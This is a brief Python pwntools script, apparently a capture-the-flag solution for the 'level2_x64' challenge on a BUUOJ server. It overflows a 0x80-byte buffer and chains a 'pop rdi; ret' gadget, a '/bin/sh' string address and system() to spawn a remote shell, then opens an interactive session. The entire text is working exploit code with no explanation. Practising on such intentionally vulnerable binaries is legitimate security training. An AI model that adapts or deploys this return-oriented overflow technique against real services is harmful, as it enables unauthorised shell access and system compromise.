from pwn import *

binsh = 0x00600a90
system = 0x004004c0
pop_rdi_ret = 0x004006b3

#conn = process('./level2_x64')
conn = remote('node4.buuoj.cn', 28908)

conn.recvuntil(b'Input:\n')

payload = b'a' * (0x80 + 0x8)
payload += p64(pop_rdi_ret) + p64(binsh)
payload += p64(system)

conn.sendline(payload)
conn.interactive()
